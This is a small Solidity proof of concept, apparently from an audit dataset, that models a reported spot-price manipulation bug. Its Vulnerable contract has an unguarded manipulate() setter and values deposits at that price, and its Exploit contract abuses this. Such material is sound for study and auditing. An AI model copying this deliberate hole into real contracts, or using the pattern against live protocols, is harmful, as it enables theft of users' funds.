// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// AuditVault 63167: Ammplify maker spot-price manipulation. Reduced local model preserves the reported state transition.

contract Vulnerable {
    uint256 public spotPrice = 100; uint256 public liquidity; function manipulate(uint256 p) external { spotPrice = p; } function depositMaker(uint256 amount) external returns (uint256) { liquidity += amount; return amount * spotPrice; }
}

contract Exploit {
    Vulnerable public bug;
    bool public success;

    constructor() {
        bug = new Vulnerable();
    }

    function attack() external {
        bug.manipulate(1); success = bug.depositMaker(100) == 100;
    }
}


